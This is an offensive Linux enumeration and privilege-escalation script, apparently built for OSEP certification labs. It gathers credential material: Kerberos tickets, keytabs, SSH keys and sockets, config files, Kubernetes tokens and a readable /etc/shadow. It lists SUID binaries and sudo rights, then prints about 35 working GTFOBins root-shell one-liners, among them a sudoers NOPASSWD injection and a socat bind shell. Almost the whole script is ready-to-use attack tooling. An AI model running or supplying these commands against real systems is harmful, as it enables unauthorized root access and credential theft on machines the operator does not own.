#!/bin/bash
# PathMaster Standalone (Linux)
# Goal: Unified Collection & Analysis for OSEP
# Version: 3.0 (Master - Integrated & Enhanced)
# Includes: System Enumeration, GTFOBins, Kerberos/SSH, Automation, Capabilities & Network Analysis.

echo -e "\n------------------------------------------------------------"
echo "      PathMaster Master: OSEP Unified Attack Path Report"
echo -e "------------------------------------------------------------"

# 0. System & User Information
echo -e "\n=== SYSTEM & USER INFO ==="
echo "[*] Kernel: $(uname -a)"
[ -f /etc/os-release ] && echo "[*] OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')"
echo "[*] Hostname: $(hostname)"
echo "[*] Current User: $(id)"
echo "[*] System Users: $(cut -d: -f1 /etc/passwd | tr '\n' ' ' | sed 's/ $//')"
echo -e "\n[*] Recent Logins (last 5):"
last -n 5 2>/dev/null | grep -v "wtmp" | grep -v "^$"

# 1. Network & Processes
echo -e "\n=== NETWORK & PROCESSES ==="
echo "[*] Network Interfaces:"
ip -br a 2>/dev/null || ifconfig -a 2>/dev/null | grep "inet "
echo -e "\n[*] Active Connections (ss -antp):"
ss -antp 2>/dev/null | grep -v "State" | head -n 15
echo -e "\n[*] Listening Services:"
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null
echo -e "\n[*] Running Processes (Top 10 by CPU):"
ps aux --sort=-%cpu 2>/dev/null | head -n 11

# 2. Scheduled Tasks & Wildcards
echo -e "\n=== SCHEDULED TASKS (CRON) ==="
ls -la /etc/cron* 2>/dev/null | grep -v "^total"
[ -f /etc/crontab ] && echo "[*] /etc/crontab content:" && cat /etc/crontab | grep -v "^#" | grep -v "^$"
echo "[*] Checking for dangerous wildcards in Cron:"
grep -r "\*" /etc/cron* /etc/crontab 2>/dev/null | grep -E "tar|7z|zip|cp|mv"

# 3. Kerberos Artifacts (Unit 19)
echo -e "\n=== KERBEROS ARTIFACTS (Unit 19) ==="
CCACHE=$(find /tmp -name "krb5cc_*" 2>/dev/null)
if [ ! -z "$CCACHE" ]; then 
    echo -e "[!] CCACHE TICKETS FOUND:"
    echo "$CCACHE"
fi
KEYTABS=$(find /etc /home /var/www /root -name "*.keytab" 2>/dev/null)
if [ ! -z "$KEYTABS" ]; then 
    echo -e "[!] KEYTABS FOUND:"
    echo "$KEYTABS"
fi

# 4. SSH Hijacking & Config (Unit 19)
echo -e "\n=== SSH HIJACKING & CONFIG ==="
SOCKETS=$(find /tmp /home /root -type s 2>/dev/null | grep -i "ssh")
if [ ! -z "$SOCKETS" ]; then
    for s in $SOCKETS; do
        echo -e "[!] ACTIVE CONTROLMASTER SOCKET: $s"
        echo "    Command: ssh -S $s <USER>@<HOST>"
    done
fi
[ -f /etc/ssh/sshd_config ] && echo "[*] SSHD Config (Interesting):" && grep -E "PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|AuthorizedKeysFile" /etc/ssh/sshd_config | grep -v "^#"

# 5. User Data, Flags & SSH Keys
echo -e "\n=== OSEP FLAGS & SSH KEYS ==="
HOMES=$(cut -d: -f6 /etc/passwd | grep -E "/home/|/root" | sort -u)
for home in $HOMES; do
    user=$(basename $home)
    [ "$home" == "/root" ] && user="root"
    
    # Check Flags
    if [ "$user" == "root" ]; then
        [ -f "/root/proof.txt" ] && echo -e "[!] FLAG FOUND (root): /root/proof.txt"
        [ -f "/root/secret.txt" ] && echo -e "[!] FLAG FOUND (root): /root/secret.txt"
    else
        [ -f "$home/local.txt" ] && echo -e "[!] FLAG FOUND ($user): $home/local.txt"
    fi

    # Check SSH Keys & Bash History
    if [ -d "$home" ]; then
        [ -f "$home/.bash_history" ] && echo "[*] Bash history found for $user: $home/.bash_history"
        if [ -d "$home/.ssh" ]; then
            KEYS=$(find "$home/.ssh" -type f 2>/dev/null)
            if [ ! -z "$KEYS" ]; then
                echo "[*] SSH Folder found for $user: $home/.ssh"
                for k in $KEYS; do echo "    -> SSH Artifact: $(basename $k)"; done
            fi
        fi
    fi
done

# 6. Automation & Containers (Unit 21)
echo -e "\n=== AUTOMATION & CONTAINERS ==="
ANSIBLE_HOME=$(getent passwd ansible | cut -d: -f6)
if [ ! -z "$ANSIBLE_HOME" ]; then
    echo "[!] ANSIBLE USER DETECTED: $ANSIBLE_HOME"
    find "$ANSIBLE_HOME" -maxdepth 2 -name "*vault*" -o -name "*.yml" -o -name "*.yaml" -o -name "*.cfg" 2>/dev/null | xargs -I {} echo "    -> Interesting File: {}"
fi
find /etc/ansible /home /root -name "hosts" -o -name "ansible.cfg" -o -name "inventory" 2>/dev/null | xargs -I {} echo "[!] AUTOMATION FILE: {}"

# Container Detection
if [ -f /.dockerenv ]; then echo "[!] DOCKER: Running inside a container!"; fi
if command -v docker >/dev/null 2>&1; then echo "[*] DOCKER: Binary found on host"; fi
if [ -d /var/run/secrets/kubernetes.io ]; then echo "[!] KUBERNETES: Service account tokens found!"; fi

# 7. Interesting Files & Writable PATH
echo -e "\n=== INTERESTING FILES & AREAS ==="
# Database Config Files
DB_CONFIGS=$(find /var/www /etc /home /opt -maxdepth 3 \( -name "wp-config.php" -o -name ".env" -o -name "settings.php" -o -name "configuration.php" -o -name "*.my.cnf" -o -name "pg_hba.conf" -o -name "postgresql.conf" -o -name "redis.conf" -o -name "mongod.conf" \) 2>/dev/null)
if [ ! -z "$DB_CONFIGS" ]; then
    echo -e "[!] DATABASE CONFIG FILES FOUND:"
    echo "$DB_CONFIGS" | xargs -I {} echo "    -> Found: {}"
fi
# Writable PATH
echo "[*] Checking for writable directories in PATH:"
echo $PATH | tr ":" "\n" | while read dir; do [ -w "$dir" ] && echo "    [!] WRITABLE PATH: $dir"; done

# NFS Shares
[ -f /etc/exports ] && echo "[*] NFS Exports:" && grep "no_root_squash" /etc/exports && echo "    [!] VULNERABLE: no_root_squash detected!"

# 8. Privileges, Capabilities & GTFOBins
echo -e "\n=== LOCAL PRIVILEGES & ESCALATION ==="
# Shadow check
[ -r /etc/shadow ] && echo "[!] CRITICAL: /etc/shadow is READABLE!"

# SUID/SGID
echo "[*] SUID Binaries (Potential Escalation):"
find / -perm -u=s -type f 2>/dev/null | head -n 15 | xargs -I {} echo "    -> SUID: {}"

# Capabilities
echo "[*] Linux Capabilities:"
getcap -r / 2>/dev/null | grep -vE "/usr/bin/ping|/usr/bin/traceroute" | head -n 10

# Sudo & GTFOBins
SUDO_L=$(sudo -l 2>/dev/null)
if [ ! -z "$SUDO_L" ]; then
    echo -e "[!] SUDO PERMISSIONS:\n$SUDO_L"
    
    echo -e "\n[!] POTENTIAL GTFOBINS ESCALATION PATHS:"
    
    check_gtfo() {
        if echo "$SUDO_L" | grep -qi "$1"; then
            echo -e "    [!] Binary: $1"
            echo -e "        Exploit: $2"
        fi
    }

    if echo "$SUDO_L" | grep -Ei "ALL|sudo su|sudo -i"; then
        echo -e "    [!] Binary: sudo su / sudo -i"
        echo -e "        Exploit: Full root access available. Run 'sudo su' or 'sudo -i'"
    fi

    check_gtfo "find" "sudo find . -exec /bin/sh \; -quit"
    check_gtfo "vim" "sudo vim -c ':!/bin/sh'"
    check_gtfo "vi" "sudo vi -c ':!/bin/sh'"
    check_gtfo "awk" "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
    check_gtfo "nmap" "echo \"os.execute('/bin/sh')\" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse"
    check_gtfo "pip" "TF=\$(mktemp -d); echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\$(tty) >\$(tty) 2>\$(tty)')\" > \$TF/setup.py; sudo pip install \$TF"
    check_gtfo "man" "sudo man man (Then type: !sh)"
    check_gtfo "less" "sudo less /etc/hosts (Then type: !sh)"
    check_gtfo "more" "sudo more /etc/hosts (Then type: !sh)"
    check_gtfo "perl" "sudo perl -e 'exec \"/bin/sh\";'"
    check_gtfo "python" "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
    check_gtfo "ruby" "sudo ruby -e 'exec \"/bin/sh\"'"
    check_gtfo "lua" "sudo lua -e 'os.execute(\"/bin/sh\")'"
    check_gtfo "php" "sudo php -r \"system('/bin/sh');\""
    check_gtfo "node" "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
    check_gtfo "sed" "sudo sed -n '1e exec /bin/sh' /etc/hosts"
    check_gtfo "ed" "sudo ed (Then type: !/bin/sh)"
    check_gtfo "tar" "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    check_gtfo "zip" "TF=\$(mktemp -u); sudo zip \$TF /etc/hosts -T -TT 'sh #'; rm \$TF"
    check_gtfo "gdb" "sudo gdb -nx -ex '!sh' -ex quit"
    check_gtfo "strace" "sudo strace -o /dev/null /bin/sh"
    check_gtfo "expect" "sudo expect -c 'spawn /bin/sh; interact'"
    check_gtfo "git" "sudo git -p help config (Then type: !/bin/sh)"
    check_gtfo "ftp" "sudo ftp (Then type: !/bin/sh)"
    check_gtfo "socat" "sudo socat exec:'sh',pty,stderr,setsid,sigint,sane tcp-listen:1234"
    check_gtfo "docker" "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    check_gtfo "apt-get" "sudo apt-get update -o APT::Update::Pre-Invoke::=\"/bin/sh\""
    check_gtfo "apt" "sudo apt update -o APT::Update::Pre-Invoke::=\"/bin/sh\""
    check_gtfo "tcpdump" "echo 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh' > /tmp/x.sh; chmod +x /tmp/x.sh; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x.sh -Z root"
    check_gtfo "tee" "echo \"\$(whoami) ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers"
    check_gtfo "systemctl" "TF=\$(mktemp).service; echo -e \"[Service]\nExecStart=/bin/sh -c 'id > /tmp/out'\n[Install]\nWantedBy=multi-user.target\" > \$TF; sudo systemctl link \$TF; sudo systemctl enable --now \$TF"
    check_gtfo "journalctl" "sudo journalctl (Then type: !sh)"
    check_gtfo "mysql" "sudo mysql -e '\\! /bin/sh'"
    check_gtfo "ssh" "sudo ssh -o ProxyCommand=';/bin/sh' localhost"
    check_gtfo "mount" "sudo mount -t cgroup -o rdma cgroup /mnt/tmp -o release_agent=/bin/sh && sudo umount /mnt/tmp"
fi

echo -e "\n------------------------------------------------------------"
